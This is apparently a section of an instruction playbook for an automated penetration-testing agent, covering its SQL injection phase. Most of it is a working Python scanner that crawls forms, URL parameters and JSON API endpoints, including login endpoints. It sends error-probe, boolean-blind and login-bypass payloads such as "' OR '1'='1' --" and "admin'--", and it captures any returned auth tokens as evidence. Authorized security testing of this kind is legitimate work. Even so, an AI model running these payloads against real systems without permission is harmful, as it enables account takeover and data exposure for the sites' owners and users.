**Phase 6 — SQL Injection**

  CRITICAL RULES — violating these causes missed SQLi:
    1. Use the ACTUAL form method (GET or POST) — never assume GET for all forms
    2. Use the ACTUAL field names from the form — never hardcode 'q' or 'id'
    3. Use `session` (authenticated) for endpoints that require login
    4. For login forms: test the USERNAME field via POST — password is often hashed so inject username

  ```python
  import time
  from urllib.parse import urlparse, parse_qs, urljoin

  SQL_ERRORS = [
      'syntax error', 'sqlite', 'sqlite3', 'query error',
      'mysql_fetch', 'you have an error in your sql', 'warning: mysql',
      'unclosed quotation mark', 'quoted string not properly terminated',
      'sqlstate', 'ora-', 'pg_query', 'sql error',
      'microsoft ole db', 'odbc', 'jdbc', 'operationalerror',
  ]

  def sqli_error_found(text):
      t = text.lower()
      return [e for e in SQL_ERRORS if e in t]

  sqli_findings = []

  # ── Part A: Test every form (use actual method + field names) ─────────────────
  ALL_FORMS  = _G.get('ALL_FORMS',  [])
  AUTH_FORMS = _G.get('AUTH_FORMS', [])
  all_forms  = ALL_FORMS + AUTH_FORMS

  print(f"SQLi Phase — testing {len(all_forms)} forms")

  for form in all_forms:
      action  = form.get('action', BASE)
      method  = form.get('method', 'get').lower()
      fields  = form.get('fields', [])
      url     = action if action.startswith('http') else urljoin(BASE, action)

      # Build normal baseline data using each field's name
      field_names = [f['name'] for f in fields if f.get('name')]
      if not field_names:
          continue

      print(f"\n  Testing {method.upper()} {url}  fields={field_names}")

      for target_field in field_names:
          # Skip password fields — they are usually hashed server-side
          # Exception: test username/email fields on login forms (SQLi in username bypasses hash)
          if target_field.lower() in ('csrf_token', 'token', '_token', 'hidden'):
              continue

          time.sleep(0.4)

          # Build payload data — normal values for all fields except the one being tested
          def make_data(inject_val):
              d = {}
              for f in fields:
                  name = f.get('name', '')
                  if not name:
                      continue
                  if name == target_field:
                      d[name] = inject_val
                  elif 'pass' in name.lower():
                      d[name] = 'TestPass123!'
                  elif 'user' in name.lower() or 'email' in name.lower():
                      d[name] = 'testuser'
                  else:
                      d[name] = f.get('value', 'test')
              return d

          # Step 1: Baseline
          baseline_data = make_data('testinput')
          if method == 'post':
              r_base = session.post(url, data=baseline_data, timeout=8, allow_redirects=True)
          else:
              r_base = session.get(url, params=baseline_data, timeout=8)

          if r_base.status_code in (403, 429, 503):
              print(f"    [{target_field}] Blocked (HTTP {r_base.status_code}) — skipping")
              continue

          # Step 2: Single quote error probe
          err_data = make_data("'")
          if method == 'post':
              r_err = session.post(url, data=err_data, timeout=8, allow_redirects=True)
          else:
              r_err = session.get(url, params=err_data, timeout=8)

          errors = sqli_error_found(r_err.text)
          if errors:
              print(f"    [CRITICAL] SQLi ERROR in field '{target_field}' on {url}")
              print(f"    SQL errors in response: {errors}")
              print(f"    Evidence: {r_err.text[:400]}")
              sqli_findings.append({'field': target_field, 'url': url, 'method': method, 'type': 'error-based'})
              continue

          # Step 3: Auth bypass probe (especially for login username fields)
          if any(k in target_field.lower() for k in ('user', 'email', 'login', 'name')):
              bypass_data = make_data("' OR '1'='1' --")
              if method == 'post':
                  r_bypass = session.post(url, data=bypass_data, timeout=8, allow_redirects=True)
              else:
                  r_bypass = session.get(url, params=bypass_data, timeout=8)

              # Auth bypass: redirected to dashboard or response has auth content
              auth_signs = ['dashboard', 'logout', 'welcome', 'profile', 'account', 'admin']
              if any(s in r_bypass.text.lower() for s in auth_signs):
                  if r_bypass.url != url or r_bypass.status_code in (200, 302):
                      print(f"    [CRITICAL] SQLi AUTH BYPASS via field '{target_field}' on {url}")
                      print(f"    Final URL: {r_bypass.url}  Status: {r_bypass.status_code}")
                      print(f"    Evidence: {r_bypass.text[:300]}")
                      sqli_findings.append({'field': target_field, 'url': url, 'method': method, 'type': 'auth-bypass'})
                      continue

          # Step 4: Boolean blind (string params)
          true_data  = make_data("test' AND '1'='1")
          false_data = make_data("test' AND '1'='2")
          if method == 'post':
              r_true  = session.post(url, data=true_data,  timeout=8, allow_redirects=True)
              r_false = session.post(url, data=false_data, timeout=8, allow_redirects=True)
          else:
              r_true  = session.get(url, params=true_data,  timeout=8)
              r_false = session.get(url, params=false_data, timeout=8)

          diff = abs(len(r_true.text) - len(r_false.text))
          if diff > 200 and not sqli_error_found(r_true.text):
              print(f"    [HIGH] Boolean SQLi on field '{target_field}': TRUE={len(r_true.text)}b FALSE={len(r_false.text)}b (diff={diff}b)")
              print(f"    TRUE snippet:  {r_true.text[:200]}")
              print(f"    FALSE snippet: {r_false.text[:200]}")
              sqli_findings.append({'field': target_field, 'url': url, 'method': method, 'type': 'boolean-blind'})
          else:
              print(f"    [{target_field}] No SQLi detected (error:{bool(errors)} bool_diff:{diff}b)")

  # ── Part B: Test URL parameters from spider + auth crawl ─────────────────────
  ALL_LINKS = _G.get('ALL_LINKS', set())
  AUTH_PARAMS = _G.get('AUTH_PARAMS', [])
  # Combine: unauth spider links with ?params + auth crawl discovered params
  param_urls = [(u, parse_qs(urlparse(u).query)) for u in ALL_LINKS if '?' in u]
  # Add AUTH_PARAMS (from authenticated crawl) — these may have params not in ALL_LINKS
  _seen_sqli = set((u, p) for u, pdict in param_urls for p in pdict)
  for ap in AUTH_PARAMS:
      _key = (ap['url'].split('?')[0], ap['param'])
      if _key not in _seen_sqli:
          param_urls.append((ap['url'], {ap['param']: [ap.get('value', 'test')]}))
          _seen_sqli.add(_key)
  print(f"\nSQLi Phase — testing {len(param_urls)} URL parameter endpoints (spider + auth crawl)")

  for full_url, params in param_urls:
      base_url = full_url.split('?')[0]
      for param_name in params:
          time.sleep(0.4)
          print(f"\n  Testing GET {base_url} ?{param_name}=")

          # Step 1: baseline
          r_base = session.get(base_url, params={param_name: 'test'}, timeout=8)
          if r_base.status_code in (403, 429, 503):
              print(f"    Blocked (HTTP {r_base.status_code}) — skipping")
              continue
          if r_base.status_code == 302 and 'login' in r_base.headers.get('Location','').lower():
              print(f"    Requires auth — retrying with session")

          # Step 2: single quote error
          r_err = session.get(base_url, params={param_name: "'"}, timeout=8)
          errors = sqli_error_found(r_err.text)
          if errors:
              print(f"    [CRITICAL] SQLi ERROR in ?{param_name}= on {base_url}")
              print(f"    SQL errors: {errors}")
              print(f"    Evidence: {r_err.text[:500]}")
              sqli_findings.append({'field': param_name, 'url': base_url, 'method': 'get', 'type': 'error-based'})
              continue

          # Step 3: boolean blind
          r_true  = session.get(base_url, params={param_name: "test' AND '1'='1"}, timeout=8)
          r_false = session.get(base_url, params={param_name: "test' AND '1'='2"}, timeout=8)
          diff = abs(len(r_true.text) - len(r_false.text))
          if diff > 200:
              print(f"    [HIGH] Boolean SQLi on ?{param_name}=: TRUE={len(r_true.text)}b FALSE={len(r_false.text)}b")
              sqli_findings.append({'field': param_name, 'url': base_url, 'method': 'get', 'type': 'boolean-blind'})
          else:
              print(f"    [{param_name}] No SQLi detected")

  # ── Part C: JSON API SQLi (for SPAs — test all API endpoints with JSON payloads) ──
  CONFIRMED_APIS = _G.get('CONFIRMED_APIS', [])
  api_login_url  = _G.get('api_login_url', '')

  # Build list of JSON API endpoints to test
  json_api_targets = []
  # 1. Add the login endpoint (classic Juice Shop SQLi target)
  if api_login_url:
      api_fields = _G.get('api_login_fields', {})
      json_api_targets.append({
          'url': api_login_url,
          'fields': api_fields,
          'desc': 'API login endpoint',
      })
  # 2. Add confirmed APIs that accept input (search, etc.)
  for api in CONFIRMED_APIS:
      url = api['url']
      if any(kw in url.lower() for kw in ['search', 'query', 'find', 'lookup', 'filter']):
          json_api_targets.append({
              'url': url,
              'fields': {'q': 'test'},
              'desc': 'Search/query endpoint',
          })
  # 3. Try common parameterized API paths from ALL_LINKS
  for link in ALL_LINKS:
      if '?' in link and ('/rest/' in link or '/api/' in link):
          from urllib.parse import urlparse as _up, parse_qs as _pq
          _parsed = _up(link)
          _params = _pq(_parsed.query)
          if _params:
              json_api_targets.append({
                  'url': link.split('?')[0],
                  'fields': {k: v[0] for k, v in _params.items()},
                  'desc': f'API with params: {list(_params.keys())}',
              })

  if json_api_targets:
      print(f"\n[SQLi] Testing {len(json_api_targets)} JSON API endpoints")

      for target in json_api_targets:
          url    = target['url']
          fields = target['fields']
          desc   = target['desc']

          print(f"\n  Testing JSON API: {url} ({desc})")

          for field_name in fields:
              time.sleep(0.3)

              # Baseline: normal request
              normal_payload = dict(fields)
              try:
                  r_base = session.post(url, json=normal_payload, timeout=8)
              except Exception:
                  continue

              # Single quote error probe
              err_payload = dict(fields)
              err_payload[field_name] = "'"
              try:
                  r_err = session.post(url, json=err_payload, timeout=8)
                  errors = sqli_error_found(r_err.text)
                  if errors:
                      print(f"    [CRITICAL] SQLi ERROR in JSON field '{field_name}' on {url}")
                      print(f"    SQL errors: {errors}")
                      print(f"    Evidence: {r_err.text[:400]}")
                      sqli_findings.append({'field': field_name, 'url': url, 'method': 'post-json', 'type': 'error-based'})
                      continue
              except Exception:
                  continue

              # Auth bypass for login endpoints
              if 'login' in url.lower() or 'auth' in url.lower():
                  bypass_payload = dict(fields)
                  for sqli_val in ["' OR '1'='1'--", "' OR 1=1--", "admin'--"]:
                      bypass_payload[field_name] = sqli_val
                      try:
                          r_bypass = session.post(url, json=bypass_payload, timeout=8)
                          if r_bypass.status_code == 200:
                              try:
                                  data = r_bypass.json()
                                  data_str = str(data)
                                  if 'token' in data_str.lower() or 'auth' in data_str.lower():
                                      print(f"    [CRITICAL] SQLi AUTH BYPASS via JSON field '{field_name}' on {url}")
                                      print(f"    Payload: {sqli_val}")
                                      print(f"    Response: {data_str[:300]}")
                                      sqli_findings.append({
                                          'field': field_name, 'url': url,
                                          'method': 'post-json', 'type': 'auth-bypass',
                                          'evidence': data_str[:300],
                                      })
                                      break
                              except Exception:
                                  pass
                      except Exception:
                          continue

              # Boolean blind for search/query endpoints
              if 'search' in url.lower() or 'q' in fields:
                  try:
                      true_p = dict(fields)
                      true_p[field_name] = "test' AND '1'='1"
                      false_p = dict(fields)
                      false_p[field_name] = "test' AND '1'='2"
                      # Try as GET params for search endpoints
                      r_true = session.get(url, params=true_p, timeout=8)
                      r_false = session.get(url, params=false_p, timeout=8)
                      diff = abs(len(r_true.text) - len(r_false.text))
                      if diff > 200:
                          print(f"    [HIGH] Boolean SQLi on JSON API ?{field_name}=: diff={diff}b")
                          sqli_findings.append({'field': field_name, 'url': url, 'method': 'get', 'type': 'boolean-blind'})
                  except Exception:
                      pass

  print(f"\n=== SQLi SUMMARY: {len(sqli_findings)} injection points found ===")
  for f in sqli_findings:
      print(f"  [{f['type'].upper()}] {f['method'].upper()} {f['url']} — field: {f['field']}")
  _G['SQLI_FINDINGS'] = sqli_findings
  ```

  ONLY report SQLi if error strings appear OR boolean diff > 200 bytes with real data content.
  NEVER report SQLi based only on response size difference without content verification.
